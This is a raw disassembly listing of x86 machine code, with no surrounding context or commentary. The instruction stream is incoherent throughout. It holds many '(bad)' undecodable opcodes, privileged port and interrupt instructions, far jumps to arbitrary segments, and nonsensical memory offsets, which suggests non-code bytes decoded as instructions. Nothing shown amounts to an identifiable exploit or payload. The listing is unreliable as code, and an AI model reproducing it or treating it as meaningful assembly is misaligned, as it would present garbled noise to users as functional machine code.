  42e96f:	mov    WORD PTR [esi+eiz*8+0x44],?
  42e973:	push   eax
  42e974:	call   0x455ae5
  42e979:	push   0x72
  42e97b:	bnd jmp DWORD PTR [ecx+0x48]
  42e97f:	push   es
  42e980:	ret    0xe1a4
  42e983:	(bad)  
  42e984:	jae    0x42e97d
  42e986:	jmp    0x42e9ce
  42e988:	(bad)  
  42e98a:	push   cs
  42e98b:	outs   dx,DWORD PTR ds:[esi]
  42e98c:	cli    
  42e98d:	(bad)  
  42e98e:	sti    
  42e98f:	inc    esi
  42e990:	fsub   QWORD PTR [eax+0x3b]
  42e993:	repnz cli 
  42e995:	add    BYTE PTR [ecx-0x3b8a7e6a],bl
  42e99b:	pop    ebx
  42e99c:	push   cs
  42e99d:	add    al,0xdc
  42e99f:	add    eax,DWORD PTR [ebp+0x7b3992db]
  42e9a5:	gs adc al,0x4
  42e9a8:	mov    DWORD PTR [ebp+0x0],ebx
  42e9ab:	add    BYTE PTR [eax],al
  42e9ad:	add    BYTE PTR [eax],al
  42e9af:	or     BYTE PTR [ebx-0x3],bh
  42e9b2:	add    bl,BYTE PTR [ecx+0x6e]
  42e9b5:	fs add bl,dh
  42e9b8:	clc    
  42e9b9:	sbb    edi,edi
  42e9bb:	cdq    
  42e9bc:	mov    esi,ebp
  42e9be:	jne    0x42e968
  42e9c0:	outs   dx,BYTE PTR ds:[esi]
  42e9c1:	jae    0x42e9d3
  42e9c3:	add    edi,eax
  42e9c5:	or     ebp,eax
  42e9c7:	push   ecx
  42e9c8:	mov    al,ds:0x7307fffa
  42e9cd:	xor    esi,0x48
  42e9d0:	mov    DWORD PTR [ecx-0x2785ab83],eax
  42e9d6:	call   0x3856f6
  42e9db:	enter  0x6ec3,0x4
  42e9df:	call   0xb85a:0xb401f748
  42e9e6:	call   DWORD PTR [ebx-0x300f8486]
  42e9ec:	dec    eax
  42e9ed:	clc    
  42e9ee:	cmp    BYTE PTR [ebx-0x3f8a0bc0],dl
  42e9f4:	outs   dx,BYTE PTR ds:[esi]
  42e9f5:	sub    eax,0xfb4e12e8
  42e9fa:	(bad)  
  42e9fb:	sti    
  42e9fc:	pop    edx
  42e9fd:	adc    bl,bh
  42e9ff:	adc    DWORD PTR [ebx-0x7c],ebp
  42ea02:	inc    ebp
  42ea03:	add    ecx,ebx
  42ea05:	push   ebp
  42ea06:	pop    ebx
  42ea07:	push   ebp
  42ea08:	rcl    DWORD PTR [edx],0x0
  42ea0b:	cmp    DWORD PTR [edi-0x1a],edi
  42ea0e:	add    eax,0xfffffff9
  42ea11:	jp     0x42ea78
  42ea13:	add    BYTE PTR [eax],al
  42ea15:	add    BYTE PTR [eax],al
  42ea17:	add    BYTE PTR [ebp-0x4b],dh
  42ea1a:	add    ecx,DWORD PTR [edi+0x4a]
  42ea1d:	and    al,0x19
  42ea1f:	or     dh,ch
  42ea21:	pusha  
  42ea22:	mov    al,BYTE PTR [edx-0x165ff]
  42ea28:	cld    
  42ea29:	fisttp QWORD PTR [edi-0x745ec97a]
  42ea2f:	inc    esp
  42ea30:	mov    ebp,0xb2fc9170
  42ea35:	outs   dx,DWORD PTR ds:[esi]
  42ea36:	jg     0x42e9f7
  42ea38:	and    ebp,ecx
  42ea3a:	xchg   esi,eax
  42ea3b:	je     0x42eaae
  42ea3d:	and    al,0xd9
  42ea3f:	sti    
  42ea40:	xchg   ecx,ebx
  42ea42:	add    esp,DWORD PTR [esi+0x75]
  42ea45:	push   ds
  42ea46:	inc    ecx
  42ea47:	hlt    
  42ea48:	and    eax,0xaafb0203
  42ea4d:	sbb    ebx,DWORD PTR [eax+eax*1+0x7682ec00]
  42ea54:	sbb    DWORD PTR [ebx+0x58fe1d0f],0xafe8fb0e
  42ea5e:	mov    DWORD PTR [edi],edi
  42ea60:	ins    DWORD PTR es:[edi],dx
  42ea61:	adc    al,BYTE PTR [ecx-0x8]
  42ea64:	fistp  WORD PTR [ebx+0x6c414487]
  42ea6a:	sub    al,0xfe
  42ea6c:	inc    ebx
  42ea6d:	cmc    
  42ea6e:	fdivr  st,st(5)
  42ea70:	jne    0x42ea0d
  42ea72:	(bad)  
  42ea73:	je     0x42eaf0
  42ea75:	sbb    BYTE PTR [ecx-0x4],cl
  42ea78:	sub    al,BYTE PTR [ecx]
  42ea7a:	or     ch,BYTE PTR [edi]
  42ea7c:	add    BYTE PTR [eax],al
  42ea7e:	add    BYTE PTR [eax],al
  42ea80:	add    BYTE PTR [ebx+ebx*2],ch
  42ea83:	fld    st(0)
  42ea85:	mov    al,ds:0x114c8b98
  42ea8a:	imul   ecx,DWORD PTR [ecx-0x9fc82a4],0x899d02f9
  42ea94:	inc    esp
  42ea95:	stc    
  42ea96:	add    al,BYTE PTR [edx+0x3f]
  42ea99:	mov    esp,0x4003f0c0
  42ea9e:	jns    0x42ea64
  42eaa0:	xchg   dh,cl
  42eaa2:	inc    edx
  42eaa3:	ss xor dh,dl
  42eaa6:	xchg   edx,eax
  42eaa7:	ins    DWORD PTR es:[edi],dx
  42eaa8:	inc    ecx
  42eaa9:	gs xchg ebp,eax
  42eaab:	mov    al,ds:0x22800afe
  42eab0:	repnz arpl bx,ax
  42eab3:	adc    DWORD PTR [edi-0x53c71506],eax
  42eab9:	mov    dl,0x80
  42eabb:	call   0x5303:0x1cc2f69a
  42eac2:	ret    0x767f
  42eac5:	jne    0x42eac9
  42eac7:	jmp    0x6e04fc54
  42eacc:	rcl    DWORD PTR [edx+0x7f996cfc],0x24
  42ead3:	data16 sbb BYTE PTR [ebp-0x680c5efe],dl
  42eada:	add    ch,cl
  42eadc:	pop    esp
  42eadd:	call   0xc2fe:0xe903e917
  42eae4:	fadd   QWORD PTR [eax]
  42eae6:	add    BYTE PTR [eax],al
  42eae8:	add    BYTE PTR [eax],al
  42eaea:	mov    cl,0xa2
  42eaec:	mov    dh,0xbb
  42eaee:	aam    0xcb
  42eaf0:	stos   DWORD PTR es:[edi],eax
  42eaf1:	mov    ds:0x86cab0c7,eax
  42eaf6:	rcl    DWORD PTR [esi+0x24690fe8],0xe0
  42eafd:	inc    eax
  42eafe:	sub    DWORD PTR [eax],edx
  42eb00:	and    al,0x21
  42eb02:	ins    BYTE PTR es:[edi],dx
  42eb03:	aas    
  42eb04:	sbb    eax,0x8b78de12
  42eb09:	or     ebp,eax
  42eb0b:	test   BYTE PTR [eax+0x4],bl
  42eb0e:	jne    0x42eb12
  42eb10:	cdq    
  42eb11:	shl    DWORD PTR [ecx+0x34e8ff89],0x46
  42eb18:	stc    
  42eb19:	call   0xf91ee0fd
  42eb1e:	add    al,BYTE PTR ss:[ebp+0x44777ca9]
  42eb25:	rcl    DWORD PTR [ecx],cl
  42eb27:	in     al,dx
  42eb28:	jnp    0x42eaf9
  42eb2a:	cld    
  42eb2b:	adc    edi,0x6c
  42eb2e:	adc    al,bh
  42eb30:	sub    DWORD PTR [edx+0x71],0x2
  42eb34:	add    BYTE PTR [edx+eax*4-0x46],ah
  42eb38:	dec    edi
  42eb39:	(bad)  
  42eb3a:	loopne 0x42eae0
  42eb3c:	mov    ebp,0x84880f69
  42eb41:	test   eax,0x9986ce89
  42eb46:	push   eax
  42eb47:	nop
  42eb48:	aaa    
  42eb49:	jmp    0x0:0x837d0cc1
  42eb50:	add    BYTE PTR [eax],al
  42eb52:	add    BYTE PTR [ecx+0x7f],bh
  42eb55:	jl     0x42eb00
  42eb57:	gs out dx,al
  42eb59:	gs jmp 0xee6f85a8
  42eb5f:	fadd   QWORD PTR [edi-0x77187919]
  42eb65:	cli    
  42eb66:	jb     0x42eba0
  42eb68:	jnp    0x42ebab
  42eb6a:	in     eax,dx
  42eb6b:	push   cs
  42eb6c:	inc    eax
  42eb6d:	jl     0x42ebbe
  42eb6f:	cld    
  42eb70:	add    DWORD PTR [edx+eax*2+0x20],0x5
  42eb75:	callw  0x85fa
  42eb79:	adc    BYTE PTR [esi-0x5b787724],dh
  42eb7f:	fild   WORD PTR [esp+edi*2+0x7fe4e1f1]
  42eb86:	pushf  
  42eb87:	or     BYTE PTR [esi+ebp*2+0x414f9cc],cl
  42eb8e:	fild   DWORD PTR [ebx+0x1d0065e7]
  42eb94:	test   DWORD PTR [ebx-0x40],eax
  42eb97:	xchg   DWORD PTR [ebp+0x698a4be2],edi
  42eb9d:	cmc    
  42eb9e:	test   BYTE PTR [edx+esi*8+0x6],cl
  42eba2:	mov    esp,DWORD PTR [edi]
  42eba4:	pop    eax
  42eba5:	push   es
  42eba6:	jl     0x42eb72
  42eba8:	push   0x7e
  42ebaa:	rol    BYTE PTR [eax+0x2],0xbe
  42ebae:	inc    ebp
  42ebaf:	mov    DWORD PTR [eax],0xe8a433f7
  42ebb5:	fdiv   st(5),st
  42ebb7:	add    BYTE PTR [eax],al
  42ebb9:	add    BYTE PTR [eax],al
  42ebbb:	add    BYTE PTR [ebx],cl
  42ebbd:	xlat   BYTE PTR ds:[ebx]
  42ebbe:	out    0x73,eax
  42ebc0:	jmp    0x89c3e139
  42ebc5:	ins    BYTE PTR es:[edi],dx
  42ebc6:	cli    
  42ebc7:	jae    0x42eb72
  42ebc9:	test   BYTE PTR [ebp-0x70],bh
  42ebcc:	popf   
  42ebcd:	(bad)  
  42ebce:	dec    DWORD PTR [edi+0xb]
  42ebd1:	popf   
  42ebd2:	adc    dl,BYTE PTR [ebx]
  42ebd4:	dec    esp
  42ebd5:	push   es
  42ebd6:	cmp    BYTE PTR [ebp-0x9],0xff
  42ebda:	jae    0x42ebe3
  42ebdc:	dec    esp
  42ebdd:	add    cl,ch
  42ebdf:	mov    DWORD PTR [edi+edi*8+0x68897fff],ecx
  42ebe6:	cli    
  42ebe7:	push   cs
  42ebe8:	loopne 0x42ec56
  42ebea:	clc    
  42ebeb:	dec    ebx
  42ebed:	test   BYTE PTR [ebp+0x68],bh
  42ebf0:	dec    ebp
  42ebf1:	(bad)  
  42ebf2:	dec    DWORD PTR [edi-0x2b]
  42ebf5:	int3   
  42ebf6:	pop    es
  42ebf7:	push   DWORD PTR [ecx]
  42ebf9:	fwait
  42ebfa:	or     DWORD PTR [eax+0x5c],eax
  42ebfd:	test   BYTE PTR [ebx-0x38],al
  42ec00:	(bad)  [edx]
  42ec02:	pop    ebx
  42ec03:	add    DWORD PTR [edi+edi*8+0x4f],ecx
  42ec07:	mov    ecx,DWORD PTR [edi-0x75800aa9]
  42ec0d:	push   0xffffff83
  42ec0f:	shl    BYTE PTR [ebp+0x71],0xe0
  42ec13:	xchg   BYTE PTR ds:0x76379080,ah
  42ec19:	dec    eax
  42ec1a:	sub    al,0x0
  42ec1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec1d:	push   ds
  42ec1e:	adc    al,al
  42ec20:	add    BYTE PTR [eax],al
  42ec22:	add    BYTE PTR [eax],al
  42ec24:	add    BYTE PTR ds:0xfafa1909,cl
  42ec2a:	and    BYTE PTR [edx],bh
  42ec2c:	neg    ebp
  42ec2e:	ret    
  42ec2f:	jo     0x42ec2b
  42ec31:	jmp    0xab57:0xee043a11
  42ec38:	lods   al,BYTE PTR ds:[esi]
  42ec39:	pop    ecx
  42ec3a:	mov    ebx,0x2f9de692
  42ec3f:	add    eax,0x8659308d
  42ec44:	(bad)  
  42ec45:	int    0x7e
  42ec47:	sbb    dl,bh
  42ec49:	mov    edx,0xf9f74120
  42ec4e:	pop    eax
  42ec4f:	unpckhps xmm6,xmm4
  42ec52:	sub    esp,DWORD PTR [eax]
  42ec54:	add    DWORD PTR [ebp-0x67],esi
  42ec57:	outs   dx,BYTE PTR ds:[esi]
  42ec58:	add    BYTE PTR [ebp-0x67],dh
  42ec5b:	adc    al,0x9
  42ec5d:	inc    esi
  42ec5e:	pop    ecx
  42ec5f:	xchg   dh,al
  42ec61:	popf   
  42ec62:	lahf   
  42ec63:	adc    edx,edi
  42ec65:	adc    BYTE PTR [ebx],0x11
  42ec68:	or     BYTE PTR [edx-0x4b],bh
  42ec6b:	test   BYTE PTR [esi],0xb5
  42ec6e:	fwait
  42ec6f:	mov    BYTE PTR [esi+ebp*2+0x49],al
  42ec73:	xor    al,0x57
  42ec75:	sub    al,0xde
  42ec77:	(bad)  
  42ec78:	inc    eax
  42ec7a:	and    al,0xa8
  42ec7c:	jle    0x42ecdf
  42ec7e:	push   esp
  42ec7f:	sub    al,0x8d
  42ec81:	div    BYTE PTR [ebx+0x68750003]
  42ec87:	cs ret 0x0
  42ec8b:	add    BYTE PTR [eax],al
  42ec8d:	add    BYTE PTR [eax-0x4776fc28],dh
  42ec93:	add    bl,BYTE PTR [ecx]
  42ec95:	xchg   edi,eax
  42ec96:	sub    esi,0xd57543f5
  42ec9c:	sub    BYTE PTR [ebp-0x7d30754f],cl
  42eca2:	xchg   esi,eax
  42eca3:	add    ebp,ecx
  42eca5:	add    edi,DWORD PTR [esi+0x78]
  42eca8:	out    0x4,eax
  42ecaa:	jne    0x42ecae
  42ecac:	pusha  
  42ecad:	inc    ecx
  42ecae:	add    DWORD PTR [esi+0x2d],edi
  42ecb1:	and    al,0x74
  42ecb3:	add    ch,cl
  42ecb5:	add    ch,BYTE PTR [eax-0x72]
  42ecb8:	ins    DWORD PTR es:[edi],dx
  42ecb9:	adc    BYTE PTR [ebp+0x77],ch
  42ecbc:	sub    DWORD PTR [eax*2-0x30e8cc66],ecx
  42ecc3:	mov    DWORD PTR [ebx-0x3d],ebp
  42ecc6:	jg     0x42ed43
  42ecc8:	imul   eax,DWORD PTR [ebx],0x75
  42eccb:	add    bh,BYTE PTR [ebx+0x34036940]
  42ecd1:	or     dl,bh
  42ecd3:	shl    BYTE PTR [ebp+0x1b],0x71
  42ecd7:	aam    0xe9
  42ecd9:	mov    ch,bl
  42ecdb:	add    ch,cl
  42ecdd:	add    esp,DWORD PTR [edi+0x901dd3f]
  42ece3:	push   ds
  42ece4:	paddusb mm7,mm1
  42ece7:	aas    
  42ece8:	inc    ecx
  42ece9:	cs and eax,0x64d7db89
  42ecef:	inc    edx
  42ecf0:	jmp    0x42ed7f
  42ecf5:	add    BYTE PTR [eax],al
  42ecf7:	mov    ecx,0x7ebf658a
  42ecfc:	ja     0x42ed6b
  42ecfe:	and    esi,DWORD PTR [edx+eax*1-0x17]
  42ed02:	stos   DWORD PTR es:[edi],eax
  42ed03:	icebp  
  42ed04:	pop    es
  42ed05:	dec    ebx
  42ed06:	xchg   esi,eax
  42ed07:	dec    edi
  42ed08:	(bad)  
  42ed0a:	xchg   esi,eax
  42ed0b:	mov    ecx,0x4928658a
  42ed10:	retf   0x35ff
  42ed13:	inc    ebp
  42ed14:	icebp  
  42ed15:	push   cs
  42ed16:	test   eax,0x69868176
  42ed1b:	jno    0x42ed1f
  42ed1d:	add    BYTE PTR [ebx+0x51447776],dl
  42ed23:	data16 fnstcw WORD PTR [edi-0x5c30fff]
  42ed2a:	push   es
  42ed2b:	cmc    
  42ed2c:	dec    eax
  42ed2d:	jns    0x42ed04
  42ed2f:	dec    esp
  42ed30:	add    ecx,DWORD PTR [ebp-0x367f6154]
  42ed36:	add    DWORD PTR [ebp-0xa1905f4],esi
  42ed3c:	dec    eax
  42ed3d:	jae    0x42ed24
  42ed3f:	and    BYTE PTR [esi],bh
  42ed41:	sti    
  42ed42:	call   0xcf32fb48
  42ed47:	loop   0x42ed3d
  42ed49:	push   cs
  42ed4a:	sub    DWORD PTR [ecx-0x5f],esi
  42ed4d:	dec    edx
  42ed4e:	push   ebx
  42ed4f:	jns    0x42ecd2
  42ed51:	ret    0xb362
  42ed54:	mov    al,ds:0x8c0b2da2
  42ed59:	sub    DWORD PTR [ecx+0x0],0x0
  42ed60:	test   ecx,esp
  42ed62:	out    0xc4,al
  42ed64:	in     eax,dx
  42ed65:	xor    eax,0x20016208
  42ed6a:	repnz shl DWORD PTR [ebp-0x2d],1
  42ed6e:	gs jmp 0xfc7787bb
  42ed74:	call   0x65ec7104
  42ed79:	inc    cl
  42ed7b:	and    al,0x8
  42ed7d:	add    eax,DWORD PTR [edi+0x79cb6ae6]
  42ed83:	in     eax,0x85
  42ed85:	add    ecx,DWORD PTR [ecx+0x44c25ad7]
  42ed8b:	dec    esi
  42ed8c:	jbe    0x42ee0d
  42ed8e:	inc    esp
  42ed8f:	add    BYTE PTR [edi+edi*2+0x44d6081],dh
  42ed96:	add    al,ch
  42ed98:	jnp    0x42ed89
  42ed9a:	cmc    
  42ed9b:	jmp    DWORD PTR [ebx+0x3f]
  42ed9e:	clc    
  42ed9f:	add    DWORD PTR [ecx],0x78
  42eda2:	xor    bh,bh
  42eda4:	fldcw  WORD PTR [ebx-0x7f]
  42eda7:	inc    ebp
  42eda8:	test   BYTE PTR [ecx-0x54db0bbd],al
  42edae:	jns    0x42ee14
  42edb0:	sbb    eax,0x900f0004
  42edb5:	add    al,0xf7
  42edb7:	inc    DWORD PTR [ebx]
  42edb9:	outs   dx,DWORD PTR ds:[esi]
  42edba:	jae    0x42edac
  42edbc:	jecxz  0x42ed56
  42edbe:	adc    dl,BYTE PTR [ebx]
  42edc0:	pushf  
  42edc1:	(bad)  
  42edc2:	jg     0x42ee41
  42edc4:	add    BYTE PTR [eax],al
  42edc6:	add    BYTE PTR [eax],al
  42edc8:	add    bl,al
  42edca:	add    esi,DWORD PTR [eax+ecx*1+0x57]
  42edce:	enter  0xe807,0x77
  42edd2:	jmp    0xc889edcc
  42edd7:	neg    BYTE PTR [edi+0x62]
  42edda:	mov    ebx,0xd9cc08bc
  42eddf:	(bad)  
  42ede0:	(bad)  
  42ede1:	sub    al,0x7f
  42ede3:	(bad)  
  42ede4:	call   FWORD PTR [esi+ebp*2+0x439f2013]
  42edeb:	add    bh,dh
  42eded:	in     al,0x8a
  42edef:	mov    edx,0x4dc2c4f7
  42edf4:	xor    esi,ebx
  42edf6:	cmp    DWORD PTR [eax+0x38da8],0x0
  42edfd:	jp     0x42edac
  42edff:	add    eax,0x1cdab6
  42ee04:	add    BYTE PTR [esi+edi*8-0x53],bl
  42ee08:	mov    es,WORD PTR [esp+eax*1]
  42ee0b:	add    BYTE PTR [eax],al
  42ee0d:	jne    0x42edab
  42ee0f:	mov    ebx,0x8e30272e
  42ee14:	gs popa 
  42ee16:	inc    eax
  42ee17:	or     esp,DWORD PTR [ecx+esi*2]
  42ee1a:	mov    ah,0xb0
  42ee1c:	adc    ebp,eax
  42ee1e:	adc    al,0xd1
  42ee20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee21:	je     0x42edbc
  42ee23:	dec    BYTE PTR [edi+0x2a]
  42ee26:	xchg   BYTE PTR [edx],bh
  42ee28:	adc    dh,BYTE PTR [ebp+0xc37f99]
  42ee2e:	add    BYTE PTR [eax],al
  42ee30:	add    BYTE PTR [eax],al
  42ee32:	imul   edx,DWORD PTR [esi],0xa85973bf
  42ee38:	dec    esp
  42ee39:	sbb    ebp,0xbafffe99
  42ee3f:	les    edx,FWORD PTR [esi+0x6d23376d]
  42ee45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee46:	je     0x42ede1
  42ee48:	(bad)  
  42ee49:	jg     0x42ee3a
  42ee4b:	jmp    0xf9b9:0x6f721112
  42ee52:	mov    bh,0x20
  42ee54:	jbe    0x42edfd
  42ee56:	je     0x42edf1
  42ee58:	(bad)  
  42ee59:	out    0x6b,al
  42ee5b:	mov    edi,DWORD PTR [esi-0x79ec741a]
  42ee61:	test   al,0x74
  42ee63:	cdq    
  42ee64:	dec    BYTE PTR [edx]
  42ee66:	jmp    0x42eec8
  42ee68:	lea    edi,[edi+0xac4277a]
  42ee6e:	jmp    0x42eed2
  42ee70:	ins    BYTE PTR es:[edi],dx
  42ee71:	repnz call 0xfe99:0x74a87620
  42ee79:	mov    sp,0x1ca4
  42ee7d:	adc    al,0x82
  42ee7f:	mov    edx,fs
  42ee81:	or     ebp,eax
  42ee83:	adc    al,0xd5
  42ee85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee86:	je     0x42ee23
  42ee88:	dec    BYTE PTR [edi+0x6a]
  42ee8b:	add    edi,esp
  42ee8d:	iret   
  42ee8e:	test   BYTE PTR [edx-0x17],al
  42ee91:	xchg   BYTE PTR [esi],dh
  42ee93:	neg    DWORD PTR [eax+0x5]
  42ee99:	add    BYTE PTR [eax],al
  42ee9b:	scas   al,BYTE PTR es:[edi]
  42ee9c:	shl    ah,0x3
  42ee9f:	or     eax,0xe0ce05f1
  42eea4:	rcl    DWORD PTR [ebx+0x4c824e7e],0x8c
  42eeab:	cmc    
  42eeac:	xchg   esi,eax
  42eead:	int3   
  42eeae:	or     dh,BYTE PTR [ebp+0x2]
  42eeb1:	mov    dh,0x39
  42eeb3:	(bad)  
  42eeb4:	sbb    al,BYTE PTR [ecx+0x5d861ace]
  42eeba:	lea    ecx,[edi]
  42eebc:	lock or dh,dh
  42eebf:	dec    edx
  42eec0:	add    dh,BYTE PTR [eax+ebx*1+0x59]
  42eec4:	xor    dl,BYTE PTR [ecx]
  42eec6:	or     BYTE PTR [eax],ah
  42eec8:	mov    cl,dh
  42eeca:	jle    0x42ee75
  42eecc:	out    0xd5,al
  42eece:	inc    ebx
  42eecf:	jne    0x42ef48
  42eed1:	ins    BYTE PTR es:[edi],dx
  42eed2:	out    0xb2,eax
  42eed4:	add    ch,cl
  42eed6:	add    eax,DWORD PTR [ebp-0x7b]
  42eed9:	mov    edx,0x7cdf1686
  42eede:	add    esi,DWORD PTR [ebp+0x2]
  42eee1:	jmp    0xe85b6403
  42eee6:	(bad)  
  42eee7:	cli    
  42eee8:	ja     0x42ef3e
  42eeea:	out    0xea,eax
  42eeec:	add    ch,cl
  42eeee:	add    edi,esp
  42eef0:	inc    esi
  42eef1:	int3   
  42eef2:	push   ebx
  42eef3:	mov    ds:0xac9be885,al
  42eef8:	mov    ah,0x93
  42eefa:	xchg   edx,eax
  42eefb:	sbb    BYTE PTR [edx],al
  42eefd:	inc    DWORD PTR ds:0x0
  42ef03:	add    BYTE PTR [edx-0x3e],bl
  42ef06:	jae    0x42ef77
  42ef08:	push   esi
  42ef09:	mov    edx,0x9a7503e8
  42ef0e:	push   DWORD PTR [esp+esi*1]
  42ef11:	xchg   dl,bh
  42ef13:	pop    esp
  42ef14:	mov    dl,0xde
  42ef16:	dec    edi
  42ef17:	jo     0x42ef13
  42ef19:	loopne 0x42eebe
  42ef1b:	jmp    0xadcbf196
  42ef20:	pop    edx
  42ef21:	icebp  
  42ef22:	mov    WORD PTR [ebp+0x704fed52],fs
  42ef28:	mov    dl,0xe1
  42ef2a:	mov    ds:0x890276e9,eax
  42ef2f:	mov    ch,0x1a
  42ef31:	icebp  
  42ef32:	cli    
  42ef33:	pop    ss
  42ef34:	stos   DWORD PTR es:[edi],eax
  42ef35:	into   
  42ef36:	aas    
  42ef37:	push   DWORD PTR [esi+0x43f16602]
  42ef3d:	lods   al,BYTE PTR ds:[esi]
  42ef3e:	mov    WORD PTR [ebp-0x46b12ee6],gs
  42ef44:	out    0xb2,eax
  42ef46:	jle    0x42ef75
  42ef48:	add    bl,BYTE PTR [edi]
  42ef4a:	adc    BYTE PTR [edx+esi*4-0x22],ch
  42ef4e:	cmp    ebx,DWORD PTR [edx+0x6ad189a6]
  42ef54:	mov    dl,0xf8
  42ef56:	dec    esi
  42ef57:	je     0x42ef86
  42ef59:	ficom  WORD PTR [ebx]
  42ef5b:	jo     0x42ef02
  42ef5d:	fimul  WORD PTR [ebx+0x60]
  42ef60:	test   esi,ebx
  42ef62:	dec    edi
  42ef63:	rcr    DWORD PTR [eax],0x32
  42ef66:	cli    
  42ef67:	mov    BYTE PTR [eax],0x0
  42ef6a:	add    BYTE PTR [eax],al
  42ef6c:	add    BYTE PTR [eax-0x40],al
  42ef6f:	mov    WORD PTR [ebp-0x33],?
  42ef72:	pushf  
  42ef73:	(bad)  
  42ef74:	call   0x6a8a89ef
  42ef79:	pop    es
  42ef7a:	mov    BYTE PTR [ebp+ebp*2-0x17009b73],cl
  42ef81:	jbe    0x42effe
  42ef83:	sub    BYTE PTR [ecx+0x76],0x2
  42ef87:	add    BYTE PTR [ebp+edi*1-0x22],bl
  42ef8b:	sldt   WORD PTR ds:0x8c017e7b
  42ef92:	add    BYTE PTR [ebx+0x7e0793c6],al
  42ef98:	mov    BYTE PTR [ebp+0x0],bl
  42ef9b:	add    al,ch
  42ef9d:	call   0x4742e510
  42efa2:	mov    dl,ah
  42efa4:	mov    ds:0x3bf57385,eax
  42efa9:	lahf   
  42efaa:	jmp    0x407b:0xe04cc70c
  42efb1:	dec    esp
  42efb2:	or     DWORD PTR [ebx+0x4],esi
  42efb5:	xchg   edi,eax
  42efb6:	outs   dx,BYTE PTR ds:[esi]
  42efb7:	loope  0x42efbb
  42efb9:	das    
  42efba:	push   0xffffff8b
  42efbc:	inc    esp
  42efbd:	xor    al,dl
  42efbf:	out    0x19,eax
  42efc1:	aas    
  42efc2:	add    BYTE PTR [eax],al
  42efc4:	test   BYTE PTR [ebx+ebp*8+0x2],bl
  42efc8:	mov    edx,DWORD PTR [ebx+0x66]
  42efcb:	sbb    eax,0x7e717bfe
  42efd0:	rol    BYTE PTR [eax],0x0
  42efd3:	add    BYTE PTR [eax],al
  42efd5:	add    BYTE PTR [ecx+0x766062c1],al
  42efdb:	(bad)  
  42efdc:	call   DWORD PTR [edx+0x49]
  42efdf:	jns    0x42effb
  42efe1:	add    esp,ecx
  42efe3:	dec    DWORD PTR [edi+0xf]
  42efe6:	add    bh,BYTE PTR [ebx+0x32]
  42efe9:	add    esp,ebx
  42efeb:	dec    DWORD PTR [edi-0x1]
  42efee:	shl    DWORD PTR [ebx+0xc],0x40
  42eff2:	int3   
  42eff3:	jle    0x42efe7
  42eff5:	inc    DWORD PTR [eax-0x62fdc474]
  42effb:	(bad)  
  42effc:	push   DWORD PTR [ebx-0x69]
  42efff:	add    ch,BYTE PTR [esi+0x948f]
  42f005:	add    BYTE PTR [edi+0x75116cc0],dl
  42f00b:	les    ebx,FWORD PTR [ebx-0x708b7ae3]
  42f011:	mov    WORD PTR [ecx],?
  42f013:	mov    ch,0x2e
  42f015:	call   0xfacc5d82
  42f01a:	pop    esi
  42f01b:	into   
  42f01c:	jnp    0x42efa9
  42f01e:	repnz mov eax,0xe075fffd
  42f024:	or     BYTE PTR [ebx+0xafe9974],0xf9
  42f02b:	cli    
  42f02c:	(bad)  
  42f02d:	push   DWORD PTR [ebp+0x20]
  42f030:	mov    BYTE PTR [ebx+0x74],bl
  42f033:	cdq    
  42f034:	(bad)  
  42f035:	ss sub eax,0x36f94e
  42f03b:	add    BYTE PTR [eax],al
  42f03d:	add    BYTE PTR [eax],al
  42f03f:	ss inc ebp
  42f041:	cmc    
  42f042:	xchg   BYTE PTR [edx],dh
  42f044:	inc    ecx
  42f045:	sub    bh,ch
  42f047:	and    bl,ah
  42f049:	fwait
  42f04a:	mov    gs,ebp
  42f04c:	inc    esp
  42f04d:	loop   0x42f05a
  42f04f:	and    BYTE PTR [ebx],0x43
  42f052:	and    al,0x79
  42f054:	and    BYTE PTR [ebx-0x165927e],al
  42f05a:	(bad)  
  42f05b:	fcom   DWORD PTR ds:[edx]
  42f05e:	add    eax,0x73f661ac
  42f063:	test   DWORD PTR [ebx+0x19712441],edx
  42f069:	adc    BYTE PTR [ecx+ebp*2],ah
  42f06c:	popf   
  42f06d:	adc    al,ah
  42f06f:	fdiv   QWORD PTR [edi-0x5b8afffd]
  42f075:	push   esp
  42f076:	inc    ebx
  42f077:	cdq    
  42f078:	lea    esi,[ebp-0x4d]
  42f07b:	repnz nop
  42f07d:	add    eax,DWORD PTR [eax]
  42f07f:	jne    0x42f011
  42f081:	lea    ecx,[edx]
  42f083:	icebp  
  42f084:	arpl   WORD PTR [ebx],ax
  42f086:	add    BYTE PTR [ebp+0x2],dh
  42f089:	je     0x42f0d3
  42f08b:	push   ecx
  42f08c:	push   cs
  42f08d:	cmp    DWORD PTR [edi+0x1691fa04],ecx
  42f093:	jno    0x42f018
  42f095:	rep stos DWORD PTR es:[edi],eax
  42f097:	imul   eax,DWORD PTR [edx-0x17],0x63f2ba88
  42f09e:	pop    ebp
  42f09f:	jb     0x42f023
  42f0a1:	call   0x42f13b
  42f0a6:	add    BYTE PTR [eax],al
  42f0a8:	mov    dh,0x26
  42f0aa:	cmc    
  42f0ab:	sti    
  42f0ac:	out    0x2d,al
  42f0ae:	and    BYTE PTR [eax-0x6a],dh
  42f0b1:	xchg   al,ch
  42f0b3:	add    esi,DWORD PTR [ebp+0x11]
  42f0b6:	jl     0x42f07c
  42f0b8:	add    BYTE PTR [ebp-0x27],0x88
  42f0bc:	repnz add ch,cl
  42f0bf:	add    edx,DWORD PTR [edx+0xf]
  42f0c2:	cdq    
  42f0c3:	jp     0x42f0bc
  42f0c5:	and    bh,0x3
  42f0c8:	jne    0x42f134
  42f0ca:	or     al,0x3c
  42f0cc:	pop    ds
  42f0cd:	sub    BYTE PTR [ebp-0x42],0x12
  42f0d1:	sub    edx,DWORD PTR [ebx]
  42f0d3:	xchg   ecx,eax
  42f0d4:	(bad)  
  42f0d6:	sbb    DWORD PTR es:[ecx+edi*2],ebx
  42f0da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0db:	out    0x86,eax
  42f0dd:	add    edi,DWORD PTR [ebp+0x35]
  42f0e0:	cmp    al,0xde
  42f0e2:	les    ecx,FWORD PTR [ebx]
  42f0e4:	jle    0x42f07d
  42f0e6:	sub    dl,cl
  42f0e8:	sub    edi,eax
  42f0ea:	cmp    DWORD PTR [edx+0x74],0xffffffea
  42f0ee:	js     0x42f0f8
  42f0f0:	jne    0x42f0f4
  42f0f2:	ins    BYTE PTR es:[edi],dx
  42f0f3:	jg     0x42f08b
  42f0f5:	sahf   
